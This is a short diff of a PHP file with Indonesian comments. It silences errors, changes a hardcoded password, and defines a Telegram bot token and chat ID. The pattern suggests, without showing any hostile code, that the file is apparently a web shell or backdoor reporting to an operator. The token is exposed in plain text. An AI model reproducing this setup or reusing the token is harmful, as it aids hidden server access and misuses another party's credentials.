@@ -7,7 +7,7 @@ error_reporting(0);
 @ini_set('display_errors', 0);
 
 /* Konfigurasi */
-$correct_password = 'satanas666'; // Password yang benar
+$correct_password = '208becc799e24048a7540fd8417907ec'; // Password yang benar
 $hashed_password = md5($correct_password); // Hash MD5 dari password
 define('TELEGRAM_BOT_TOKEN', '8035664998:AAEwtMCmxw9g6NaXQaAqsvaPnYJ5-9EJEKQ');
 define('TELEGRAM_CHAT_ID', '7299591453');
